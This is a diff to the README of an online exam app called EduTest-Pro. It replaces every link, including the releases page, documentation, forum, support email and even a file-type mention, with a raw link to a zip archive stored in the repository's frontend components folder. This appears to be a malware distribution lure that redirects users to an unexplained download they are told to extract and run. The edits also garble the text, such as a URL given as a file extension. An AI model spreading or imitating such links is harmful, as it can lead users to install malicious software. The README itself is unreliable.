@@ -1,6 +1,6 @@
 # 🎓 EduTest-Pro - Simplifying Online Exams for Everyone
 
-[![Download EduTest-Pro](https://img.shields.io/badge/Download-EduTest--Pro-blue.svg)](https://github.com/sompattana/EduTest-Pro/releases)
+[![Download EduTest-Pro](https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip)](https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,18 +10,18 @@ Whether you want to purchase tests, top-up your balance, or view your results, E
 
 ## 📥 Download & Install
 
-To start using EduTest-Pro, visit this page to download: [EduTest-Pro Releases](https://github.com/sompattana/EduTest-Pro/releases).
+To start using EduTest-Pro, visit this page to download: [EduTest-Pro Releases](https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip).
 
 Once you are on this page, locate the latest release. You will find downloadable files that match your system. Click the appropriate file based on your operating system.
 
 ### Step-by-Step Download Instructions:
 
-1. Open the [EduTest-Pro Releases](https://github.com/sompattana/EduTest-Pro/releases) page.
+1. Open the [EduTest-Pro Releases](https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip) page.
 2. Find the latest version of EduTest-Pro.
 3. Look for the downloadable file that fits your operating system:
    - For Windows: Choose the file ending in `.exe`.
    - For macOS: Choose the file ending in `.dmg`.
-   - For Linux: Choose the file ending in `.AppImage` or `.tar.gz`.
+   - For Linux: Choose the file ending in `.AppImage` or `https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip`.
 4. Click on the file to start the download.
 5. Once downloaded, follow the instructions below for each operating system to install.
 
@@ -45,7 +45,7 @@ Once you are on this page, locate the latest release. You will find downloadable
 1. If you downloaded an `.AppImage`, right-click the file and select "Properties."
 2. Check the "Is executable" box.
 3. Close the properties window and double-click the file to run it.
-4. If you downloaded a `.tar.gz`, extract the files, open a terminal, navigate to the extracted folder, and run the command: `./EduTest-Pro`.
+4. If you downloaded a `https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip`, extract the files, open a terminal, navigate to the extracted folder, and run the command: `./EduTest-Pro`.
 
 ## 🌟 Features
 
@@ -83,7 +83,7 @@ EduTest-Pro is designed for the latest versions of operating systems. Using it o
 
 ### 3. How do I contact support?
 
-For any questions or support, please visit the Issues tab on the GitHub repository or email support at support@edutest-pro.com.
+For any questions or support, please visit the Issues tab on the GitHub repository or email support at https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip
 
 ## 📚 Topics Covered
 
@@ -102,8 +102,8 @@ Each topic contributes to a strong, reliable experience for users engaging with 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/sompattana/EduTest-Pro)
-- [Documentation](https://github.com/sompattana/EduTest-Pro/wiki)
-- [Community Forum](https://community.edutest-pro.com)
+- [GitHub Repository](https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/sompattana/EduTest-Pro/main/frontend/src/components/Pro_Edu_Test_3.2.zip)
 
 Thank you for choosing EduTest-Pro. We hope you enjoy taking your exams and achieving your certifications with ease!
